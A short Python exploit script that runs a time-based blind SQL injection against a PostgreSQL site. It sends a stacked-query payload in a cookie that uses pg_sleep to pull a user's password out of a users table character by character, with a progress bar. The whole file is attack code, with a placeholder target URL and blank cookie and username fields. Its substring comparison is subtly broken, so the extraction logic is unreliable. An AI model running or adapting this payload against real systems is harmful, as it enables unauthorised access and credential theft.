import requests
import time
import string

# Replace with target
url = "https://target.site/"  
charset = string.ascii_lowercase + string.digits
password = ""

# UX feedback
print("Sleep SQLi Started")
for i in range(1, 21):
    for c in charset:
		# Add URL Encoding and user
        payload = (
            f"x';SELECT CASE WHEN (username='' AND "
            f"SUBSTRING(password,1,{i})='{c}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"
        )
        # UX feedback
        start = time.time()
        try:
            # Add the cookie
            requests.get(url, cookies={"": payload}, timeout=11)
        except requests.exceptions.ReadTimeout:
            pass
        if time.time() - start > 9:
            password += c
            percent = int((len(password) / 20) * 100)
            print(f"\r[{'#' * len(password)}] {percent}%", end="", flush=True)
            break

print(f"\nPassword: {password}")
print(f"Length: {len(password)}")